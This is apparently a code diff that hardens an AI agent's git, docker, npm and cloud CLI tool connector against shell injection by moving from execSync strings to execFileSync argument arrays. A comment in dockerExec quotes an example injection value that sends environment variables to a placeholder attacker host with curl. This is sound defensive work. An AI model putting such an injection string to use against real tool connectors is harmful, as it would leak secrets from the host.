@@ -11,7 +11,7 @@
  *   detect   — Async check for baseline availability (git)
  */
 
-import { execSync } from 'child_process';
+import { execFileSync } from 'child_process';
 import * as fs from 'fs';
 import * as path from 'path';
 
@@ -70,26 +70,31 @@ const DANGEROUS_DOCKER_PATTERNS = [
 // Helper: run a shell command safely
 // ---------------------------------------------------------------------------
 
+// Crypto Sprint 13: Deleted dead `run()` function (used shell-based execSync).
+// All callers migrated to runArgs() in Sprints 5–12. Only runArgs() remains.
+
 /**
- * Execute a shell command and return its stdout.
- * Throws on non-zero exit or timeout.
+ * Crypto Sprint 5 (HIGH — Shell Injection): Execute a command using execFileSync
+ * to avoid shell interpolation. All arguments are passed as an array, so no
+ * metacharacter escaping is needed. Use this instead of run() for any command
+ * where arguments come from untrusted sources (AI tool calls).
  */
-function run(
+function runArgs(
   cmd: string,
+  args: string[],
   opts: { cwd?: string; timeout?: number } = {}
 ): string {
   const { cwd, timeout = EXEC_TIMEOUT_MS } = opts;
   try {
-    const output = execSync(cmd, {
+    const output = execFileSync(cmd, args, {
       cwd,
       timeout,
       encoding: 'utf-8',
-      maxBuffer: 10 * 1024 * 1024, // 10 MB
+      maxBuffer: 10 * 1024 * 1024,
       stdio: ['pipe', 'pipe', 'pipe'],
     });
     return output;
   } catch (err: any) {
-    // execSync throws on non-zero exit; stderr is often the useful part
     const stderr = err.stderr?.toString?.() ?? '';
     const stdout = err.stdout?.toString?.() ?? '';
     throw new Error(stderr || stdout || err.message);
@@ -477,8 +482,9 @@ function gitStatus(args: Record<string, unknown>): ToolResult {
   const repoPath = args.repo_path as string;
 
   try {
-    const porcelain = run('git status --porcelain', { cwd: repoPath });
-    const branch = run('git branch --show-current', { cwd: repoPath }).trim();
+    // Crypto Sprint 12: Migrate from run() to runArgs() for consistency.
+    const porcelain = runArgs('git', ['status', '--porcelain'], { cwd: repoPath });
+    const branch = runArgs('git', ['branch', '--show-current'], { cwd: repoPath }).trim();
 
     // Parse porcelain output into categories
     const staged: string[] = [];
@@ -534,21 +540,22 @@ function gitLog(args: Record<string, unknown>): ToolResult {
   const since = args.since as string | undefined;
 
   try {
-    const parts = ['git log', `--max-count=${count}`];
+    // Crypto Sprint 9: Use runArgs to prevent shell injection via author/since.
+    const gitArgs = ['log', `--max-count=${count}`];
 
     if (oneline) {
-      parts.push('--oneline', '--decorate');
+      gitArgs.push('--oneline', '--decorate');
     } else {
-      parts.push('--format=medium');
+      gitArgs.push('--format=medium');
     }
     if (author) {
-      parts.push(`--author="${author}"`);
+      gitArgs.push(`--author=${author}`);
     }
     if (since) {
-      parts.push(`--since="${since}"`);
+      gitArgs.push(`--since=${since}`);
     }
 
-    const output = run(parts.join(' '), { cwd: repoPath });
+    const output = runArgs('git', gitArgs, { cwd: repoPath });
     return ok(output || 'No commits found matching the criteria.');
   } catch (err: any) {
     return fail(`git log failed: ${err.message}`);
@@ -561,11 +568,12 @@ function gitDiff(args: Record<string, unknown>): ToolResult {
   const file = args.file as string | undefined;
 
   try {
-    const parts = ['git diff'];
-    if (staged) parts.push('--cached');
-    if (file) parts.push('--', `"${file}"`);
+    // Crypto Sprint 9: Use runArgs to prevent shell injection via file path.
+    const gitArgs = ['diff'];
+    if (staged) gitArgs.push('--cached');
+    if (file) gitArgs.push('--', file);
 
-    const output = run(parts.join(' '), { cwd: repoPath });
+    const output = runArgs('git', gitArgs, { cwd: repoPath });
     if (!output.trim()) {
       return ok(staged ? 'No staged changes.' : 'No unstaged changes.');
     }
@@ -582,19 +590,16 @@ function gitCommit(args: Record<string, unknown>): ToolResult {
   const all = args.all as boolean | undefined;
 
   try {
-    // Stage files
+    // Crypto Sprint 5: Use runArgs to prevent shell injection via filenames and commit messages.
     if (files && files.length > 0) {
-      // Stage specific files one at a time to handle paths with spaces
       for (const f of files) {
-        run(`git add "${f}"`, { cwd: repoPath });
+        runArgs('git', ['add', '--', f], { cwd: repoPath });
       }
     } else if (all) {
-      run('git add -A', { cwd: repoPath });
+      runArgs('git', ['add', '-A'], { cwd: repoPath });
     }
 
-    // Escape double quotes in the commit message
-    const safeMessage = message.replace(/"/g, '\\"');
-    const output = run(`git commit -m "${safeMessage}"`, { cwd: repoPath });
+    const output = runArgs('git', ['commit', '-m', message], { cwd: repoPath });
     return ok(output);
   } catch (err: any) {
     return fail(`git commit failed: ${err.message}`);
@@ -607,25 +612,26 @@ function gitBranch(args: Record<string, unknown>): ToolResult {
   const branchName = args.branch_name as string | undefined;
 
   try {
+    // Crypto Sprint 5: Use runArgs for all branch operations to prevent injection via branch names.
     switch (action) {
       case 'list': {
-        const output = run('git branch -a --no-color', { cwd: repoPath });
+        const output = runArgs('git', ['branch', '-a', '--no-color'], { cwd: repoPath });
         return ok(output || 'No branches found.');
       }
       case 'create': {
         if (!branchName) return fail('branch_name is required for create action');
-        const output = run(`git branch "${branchName}"`, { cwd: repoPath });
+        const output = runArgs('git', ['branch', branchName], { cwd: repoPath });
         return ok(output || `Branch "${branchName}" created.`);
       }
       case 'switch': {
         if (!branchName) return fail('branch_name is required for switch action');
-        const output = run(`git checkout "${branchName}"`, { cwd: repoPath });
+        const output = runArgs('git', ['checkout', branchName], { cwd: repoPath });
         return ok(output || `Switched to branch "${branchName}".`);
       }
       case 'delete': {
         if (!branchName) return fail('branch_name is required for delete action');
         // Use -d (safe delete) — refuses to delete unmerged branches
-        const output = run(`git branch -d "${branchName}"`, { cwd: repoPath });
+        const output = runArgs('git', ['branch', '-d', branchName], { cwd: repoPath });
         return ok(output || `Branch "${branchName}" deleted.`);
       }
       default:
@@ -642,23 +648,24 @@ function gitStash(args: Record<string, unknown>): ToolResult {
   const message = args.message as string | undefined;
 
   try {
+    // Crypto Sprint 5: Use runArgs to prevent shell injection via stash messages.
     switch (action) {
       case 'push': {
-        const parts = ['git stash push'];
-        if (message) parts.push(`-m "${message.replace(/"/g, '\\"')}"`);
-        const output = run(parts.join(' '), { cwd: repoPath });
+        const gitArgs = ['stash', 'push'];
+        if (message) gitArgs.push('-m', message);
+        const output = runArgs('git', gitArgs, { cwd: repoPath });
         return ok(output || 'Changes stashed.');
       }
       case 'pop': {
-        const output = run('git stash pop', { cwd: repoPath });
+        const output = runArgs('git', ['stash', 'pop'], { cwd: repoPath });
         return ok(output || 'Stash applied and dropped.');
       }
       case 'list': {
-        const output = run('git stash list', { cwd: repoPath });
+        const output = runArgs('git', ['stash', 'list'], { cwd: repoPath });
         return ok(output || 'No stashes found.');
       }
       case 'drop': {
-        const output = run('git stash drop', { cwd: repoPath });
+        const output = runArgs('git', ['stash', 'drop'], { cwd: repoPath });
         return ok(output || 'Most recent stash dropped.');
       }
       default:
@@ -674,8 +681,9 @@ function gitPull(args: Record<string, unknown>): ToolResult {
   const rebase = args.rebase as boolean | undefined;
 
   try {
-    const cmd = rebase ? 'git pull --rebase' : 'git pull';
-    const output = run(cmd, { cwd: repoPath });
+    // Crypto Sprint 9: Use runArgs for consistency (no user-controlled args but best practice).
+    const gitArgs = rebase ? ['pull', '--rebase'] : ['pull'];
+    const output = runArgs('git', gitArgs, { cwd: repoPath });
     return ok(output || 'Already up to date.');
   } catch (err: any) {
     return fail(`git pull failed: ${err.message}`);
@@ -691,7 +699,8 @@ function gitPush(args: Record<string, unknown>): ToolResult {
   try {
     // Safety: refuse to force-push to main/master
     if (force) {
-      const currentBranch = branch || run('git branch --show-current', { cwd: repoPath }).trim();
+      // Crypto Sprint 9: Use runArgs for branch name detection too.
+      const currentBranch = branch || runArgs('git', ['branch', '--show-current'], { cwd: repoPath }).trim();
       if (['main', 'master'].includes(currentBranch)) {
         return fail(
           `SAFETY BLOCK: Refusing to force-push to "${currentBranch}". ` +
@@ -701,12 +710,13 @@ function gitPush(args: Record<string, unknown>): ToolResult {
       }
     }
 
-    const parts = ['git push'];
-    if (force) parts.push('--force');
-    if (setUpstream) parts.push('-u origin');
-    if (branch) parts.push(branch);
+    // Crypto Sprint 9: Use runArgs to prevent shell injection via branch name.
+    const gitArgs = ['push'];
+    if (force) gitArgs.push('--force');
+    if (setUpstream) gitArgs.push('-u', 'origin');
+    if (branch) gitArgs.push(branch);
 
-    const output = run(parts.join(' '), { cwd: repoPath });
+    const output = runArgs('git', gitArgs, { cwd: repoPath });
     return ok(output || 'Push completed successfully.');
   } catch (err: any) {
     return fail(`git push failed: ${err.message}`);
@@ -719,12 +729,13 @@ function gitClone(args: Record<string, unknown>): ToolResult {
   const depth = args.depth as number | undefined;
 
   try {
-    const parts = ['git clone'];
-    if (depth && depth > 0) parts.push(`--depth ${depth}`);
-    parts.push(`"${url}"`);
-    if (destination) parts.push(`"${destination}"`);
+    // Crypto Sprint 9: Use runArgs to prevent shell injection via url/destination.
+    const gitArgs = ['clone'];
+    if (depth && depth > 0) gitArgs.push('--depth', String(depth));
+    gitArgs.push(url);
+    if (destination) gitArgs.push(destination);
 
-    const output = run(parts.join(' '), { timeout: 120_000 }); // allow 2 min for large repos
+    const output = runArgs('git', gitArgs, { timeout: 120_000 }); // allow 2 min for large repos
     return ok(output || `Repository cloned from ${url}`);
   } catch (err: any) {
     return fail(`git clone failed: ${err.message}`);
@@ -737,17 +748,18 @@ function gitBlame(args: Record<string, unknown>): ToolResult {
   const lines = args.lines as string | undefined;
 
   try {
-    const parts = ['git blame'];
+    // Crypto Sprint 9: Use runArgs to prevent shell injection via file/lines.
+    const gitArgs = ['blame'];
     if (lines) {
       // Format: "start,end" => "-L start,end"
       const [start, end] = lines.split(',').map((s) => s.trim());
       if (start && end) {
-        parts.push(`-L ${start},${end}`);
+        gitArgs.push('-L', `${start},${end}`);
       }
     }
-    parts.push(`-- "${file}"`);
+    gitArgs.push('--', file);
 
-    const output = run(parts.join(' '), { cwd: repoPath });
+    const output = runArgs('git', gitArgs, { cwd: repoPath });
     return ok(output || 'No blame output.');
   } catch (err: any) {
     return fail(`git blame failed: ${err.message}`);
@@ -760,10 +772,12 @@ function dockerPs(args: Record<string, unknown>): ToolResult {
   const all = args.all as boolean | undefined;
 
   try {
-    const cmd = all
-      ? 'docker ps -a --format "table {{.ID}}\\t{{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}"'
-      : 'docker ps --format "table {{.ID}}\\t{{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}"';
-    const output = run(cmd);
+    // Crypto Sprint 12: Migrate from run() to runArgs().
+    const format = 'table {{.ID}}\\t{{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}';
+    const dockerArgs = ['ps'];
+    if (all) dockerArgs.push('-a');
+    dockerArgs.push('--format', format);
+    const output = runArgs('docker', dockerArgs);
     return ok(output || 'No containers found.');
   } catch (err: any) {
     return fail(`docker ps failed: ${err.message}`);
@@ -772,9 +786,9 @@ function dockerPs(args: Record<string, unknown>): ToolResult {
 
 function dockerImages(): ToolResult {
   try {
-    const output = run(
-      'docker images --format "table {{.Repository}}\\t{{.Tag}}\\t{{.ID}}\\t{{.Size}}\\t{{.CreatedSince}}"'
-    );
+    // Crypto Sprint 12: Migrate from run() to runArgs().
+    const format = 'table {{.Repository}}\\t{{.Tag}}\\t{{.ID}}\\t{{.Size}}\\t{{.CreatedSince}}';
+    const output = runArgs('docker', ['images', '--format', format]);
     return ok(output || 'No images found.');
   } catch (err: any) {
     return fail(`docker images failed: ${err.message}`);
@@ -791,36 +805,36 @@ function dockerRun(args: Record<string, unknown>): ToolResult {
   const command = args.command as string | undefined;
 
   try {
-    const parts = ['docker run'];
+    // Crypto Sprint 9: Use runArgs to prevent shell injection via image/name/ports/volumes/env/command.
+    const dockerArgs = ['run'];
 
-    if (detach) parts.push('-d');
-    if (name) parts.push(`--name "${name}"`);
+    if (detach) dockerArgs.push('-d');
+    if (name) dockerArgs.push('--name', name);
 
     if (ports) {
-      for (const p of ports) parts.push(`-p ${p}`);
+      for (const p of ports) dockerArgs.push('-p', p);
     }
     if (volumes) {
-      for (const v of volumes) parts.push(`-v "${v}"`);
+      for (const v of volumes) dockerArgs.push('-v', v);
     }
     if (env) {
       for (const [k, v] of Object.entries(env)) {
-        parts.push(`-e "${k}=${v}"`);
+        dockerArgs.push('-e', `${k}=${v}`);
       }
     }
 
-    parts.push(image);
-    if (command) parts.push(command);
+    dockerArgs.push(image);
+    if (command) dockerArgs.push(command);
 
-    const fullCmd = parts.join(' ');
-
-    // Safety: block destructive patterns
+    // Safety: block destructive patterns (check the reconstructed command string)
+    const fullCmd = ['docker', ...dockerArgs].join(' ');
     for (const pattern of DANGEROUS_DOCKER_PATTERNS) {
       if (pattern.test(fullCmd)) {
         return fail(`SAFETY BLOCK: This docker run command matches a dangerous pattern. Please review manually.`);
       }
     }
 
-    const output = run(fullCmd);
+    const output = runArgs('docker', dockerArgs);
     return ok(output || 'Container started.');
   } catch (err: any) {
     return fail(`docker run failed: ${err.message}`);
@@ -834,29 +848,30 @@ function dockerCompose(args: Record<string, unknown>): ToolResult {
   const detach = args.detach as boolean | undefined;
 
   try {
-    const parts = ['docker compose'];
-    if (composeFile) parts.push(`-f "${composeFile}"`);
+    // Crypto Sprint 9: Use runArgs to prevent shell injection via composeFile/service.
+    const dockerArgs = ['compose'];
+    if (composeFile) dockerArgs.push('-f', composeFile);
 
     switch (action) {
       case 'up':
-        parts.push('up');
-        if (detach) parts.push('-d');
-        if (service) parts.push(service);
+        dockerArgs.push('up');
+        if (detach) dockerArgs.push('-d');
+        if (service) dockerArgs.push(service);
         break;
       case 'down':
-        parts.push('down');
+        dockerArgs.push('down');
         break;
       case 'logs':
-        parts.push('logs');
-        if (service) parts.push(service);
-        parts.push('--tail=100');
+        dockerArgs.push('logs');
+        if (service) dockerArgs.push(service);
+        dockerArgs.push('--tail=100');
         break;
       case 'ps':
-        parts.push('ps');
+        dockerArgs.push('ps');
         break;
       case 'build':
-        parts.push('build');
-        if (service) parts.push(service);
+        dockerArgs.push('build');
+        if (service) dockerArgs.push(service);
         break;
       default:
         return fail(`Unknown compose action: ${action}`);
@@ -864,7 +879,7 @@ function dockerCompose(args: Record<string, unknown>): ToolResult {
 
     // Compose up/build can take a while
     const timeout = ['up', 'build'].includes(action) ? 120_000 : EXEC_TIMEOUT_MS;
-    const output = run(parts.join(' '), { timeout });
+    const output = runArgs('docker', dockerArgs, { timeout });
     return ok(output || `docker compose ${action} completed.`);
   } catch (err: any) {
     return fail(`docker compose ${action} failed: ${err.message}`);
@@ -877,8 +892,17 @@ function dockerExec(args: Record<string, unknown>): ToolResult {
   const interactive = args.interactive as boolean | undefined;
 
   try {
-    const flags = interactive ? '-it' : '-i';
-    const output = run(`docker exec ${flags} ${container} ${command}`);
+    // Crypto Sprint 5 (HIGH — Shell Injection): Use execFileSync to prevent
+    // shell metacharacter injection via AI-provided container names or commands.
+    // The old `run(\`docker exec ${container} ${command}\`)` allowed arbitrary
+    // shell execution (e.g., container = "x; curl attacker.com/$(env)").
+    const dockerArgs = ['exec'];
+    if (interactive) dockerArgs.push('-it');
+    else dockerArgs.push('-i');
+    dockerArgs.push(container);
+    // Split command into parts — docker exec expects command + args separately
+    dockerArgs.push(...command.split(/\s+/).filter(Boolean));
+    const output = runArgs('docker', dockerArgs);
     return ok(output || 'Command executed (no output).');
   } catch (err: any) {
     return fail(`docker exec failed: ${err.message}`);
@@ -895,7 +919,8 @@ function dockerLogs(args: Record<string, unknown>): ToolResult {
     if (follow) {
       return fail('Streaming logs (follow=true) is not supported in this synchronous connector. Use tail instead.');
     }
-    const output = run(`docker logs --tail ${tail} ${container}`);
+    // Crypto Sprint 5: Use runArgs to prevent shell injection via container name.
+    const output = runArgs('docker', ['logs', '--tail', String(tail), container]);
     return ok(output || 'No logs available.');
   } catch (err: any) {
     return fail(`docker logs failed: ${err.message}`);
@@ -910,21 +935,27 @@ function npmRun(args: Record<string, unknown>): ToolResult {
   const pm = (args.package_manager as 'npm' | 'yarn' | 'pnpm') ?? detectPackageManager(cwd);
 
   try {
-    let cmd: string;
+    // Crypto Sprint 10: Use runArgs to prevent shell injection via script name.
+    // AI-controlled `script` was previously interpolated into a shell string.
+    let bin: string;
+    const pmArgs: string[] = [];
     switch (pm) {
       case 'yarn':
-        cmd = `yarn ${script}`;
+        bin = 'yarn';
+        pmArgs.push(script);
         break;
       case 'pnpm':
-        cmd = `pnpm run ${script}`;
+        bin = 'pnpm';
+        pmArgs.push('run', script);
         break;
       case 'npm':
       default:
-        cmd = `npm run ${script}`;
+        bin = 'npm';
+        pmArgs.push('run', script);
         break;
     }
 
-    const output = run(cmd, { cwd, timeout: 60_000 });
+    const output = runArgs(bin, pmArgs, { cwd, timeout: 60_000 });
     return ok(output || `Script "${script}" completed.`);
   } catch (err: any) {
     return fail(`${pm} run ${script} failed: ${err.message}`);
@@ -938,40 +969,54 @@ function npmInstall(args: Record<string, unknown>): ToolResult {
   const pm = (args.package_manager as 'npm' | 'yarn' | 'pnpm') ?? detectPackageManager(cwd);
 
   try {
-    let cmd: string;
+    // Crypto Sprint 10: Use runArgs to prevent shell injection via package names.
+    // AI-controlled package names were previously joined and interpolated into a shell string.
+    let bin: string;
+    const pmArgs: string[] = [];
 
     if (packages && packages.length > 0) {
       // Install specific packages
-      const pkgList = packages.join(' ');
       switch (pm) {
         case 'yarn':
-          cmd = `yarn add ${dev ? '--dev ' : ''}${pkgList}`;
+          bin = 'yarn';
+          pmArgs.push('add');
+          if (dev) pmArgs.push('--dev');
+          pmArgs.push(...packages);
           break;
         case 'pnpm':
-          cmd = `pnpm add ${dev ? '-D ' : ''}${pkgList}`;
+          bin = 'pnpm';
+          pmArgs.push('add');
+          if (dev) pmArgs.push('-D');
+          pmArgs.push(...packages);
           break;
         case 'npm':
         default:
-          cmd = `npm install ${dev ? '--save-dev ' : ''}${pkgList}`;
+          bin = 'npm';
+          pmArgs.push('install');
+          if (dev) pmArgs.push('--save-dev');
+          pmArgs.push(...packages);
           break;
       }
     } else {
       // Install all dependencies
       switch (pm) {
         case 'yarn':
-          cmd = 'yarn install';
+          bin = 'yarn';
+          pmArgs.push('install');
           break;
         case 'pnpm':
-          cmd = 'pnpm install';
+          bin = 'pnpm';
+          pmArgs.push('install');
           break;
         case 'npm':
         default:
-          cmd = 'npm install';
+          bin = 'npm';
+          pmArgs.push('install');
           break;
       }
     }
 
-    const output = run(cmd, { cwd, timeout: 120_000 }); // allow 2 min for installs
+    const output = runArgs(bin, pmArgs, { cwd, timeout: 120_000 }); // allow 2 min for installs
     return ok(output || 'Install completed successfully.');
   } catch (err: any) {
     return fail(`${pm} install failed: ${err.message}`);
@@ -982,7 +1027,8 @@ function npmSearch(args: Record<string, unknown>): ToolResult {
   const query = args.query as string;
 
   try {
-    const output = run(`npm search "${query}" --json`, { timeout: 15_000 });
+    // Crypto Sprint 5: Use runArgs to prevent shell injection via search query.
+    const output = runArgs('npm', ['search', query, '--json'], { timeout: 15_000 });
 
     // Parse JSON results and format top 10
     let results: any[];
@@ -1030,8 +1076,11 @@ function cloudCli(args: Record<string, unknown>): ToolResult {
   }
 
   try {
-    const fullCmd = `${provider} ${command}`;
-    const output = run(fullCmd, { timeout: 60_000 });
+    // Crypto Sprint 10: Use runArgs to prevent shell injection via cloud command string.
+    // AI-controlled `command` was previously interpolated into `${provider} ${command}`.
+    // Split command into args array for safe execFileSync execution.
+    const cmdParts = command.split(/\s+/).filter(Boolean);
+    const output = runArgs(provider, cmdParts, { timeout: 60_000 });
     return ok(output || `Command completed (no output).`);
   } catch (err: any) {
     return fail(`${provider} CLI failed: ${err.message}`);
@@ -1094,7 +1143,8 @@ export async function execute(
  */
 export async function detect(): Promise<boolean> {
   try {
-    execSync('git --version', { encoding: 'utf-8', timeout: 5000, stdio: 'pipe' });
+    // Crypto Sprint 12: Use execFileSync for consistency — no shell needed.
+    execFileSync('git', ['--version'], { encoding: 'utf-8', timeout: 5000, stdio: 'pipe' });
     return true;
   } catch {
     return false;
